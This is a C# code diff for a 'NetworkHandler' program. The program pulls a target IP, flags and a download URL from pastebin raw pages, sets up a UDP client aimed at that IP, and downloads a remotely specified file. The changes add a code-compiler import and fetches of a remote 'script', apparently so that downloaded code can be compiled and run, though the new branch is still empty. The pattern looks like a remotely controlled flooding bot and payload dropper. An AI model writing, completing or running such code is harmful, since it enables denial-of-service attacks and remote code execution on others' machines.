@@ -7,6 +7,8 @@ using System.Text;
 using System.Net;
 using System.Net.Sockets;
 using System.Collections.Specialized;
+using System.CodeDom.Compiler;
+
 
 namespace NetworkHandler
 {
@@ -28,6 +30,8 @@ namespace NetworkHandler
             string TimeAPI = client.DownloadString("https://pastebin.com/raw/1gANyTRA");
             string Version = client.DownloadString("https://pastebin.com/raw/pXCFUDXZ");
             string download = client.DownloadString("https://pastebin.com/raw/x71a1jW6");
+            string scriptTF = client.DownloadString("https://pastebin.com/raw/BSMGFKVQ");
+            var script = client.DownloadString("https://pastebin.com/raw/0kCbKm4b");
             UdpClient Client = new UdpClient();
             IPAddress ipAddr = IPAddress.Parse(IPHit);
             System.Threading.Thread.Sleep(Milliseconds);
@@ -35,6 +39,7 @@ namespace NetworkHandler
             DateTime now = DateTime.Now;
             string thisversion = "1.0";
             string username = Environment.UserName;
+
 
 
 
@@ -51,6 +56,20 @@ namespace NetworkHandler
                     WebClient webClient = new WebClient();
                     webClient.DownloadFile(download ,@"");
                 }
+
+
+                if (scriptTF == "True")
+                {
+
+                    
+
+                }
+
+                else
+                {
+
+                }
+
 
 
                 if (IPHitFT == "True")
@@ -72,7 +91,7 @@ namespace NetworkHandler
                             catch (Exception Err)
 
                             {
-
+                               
                             }
                     }
                 }
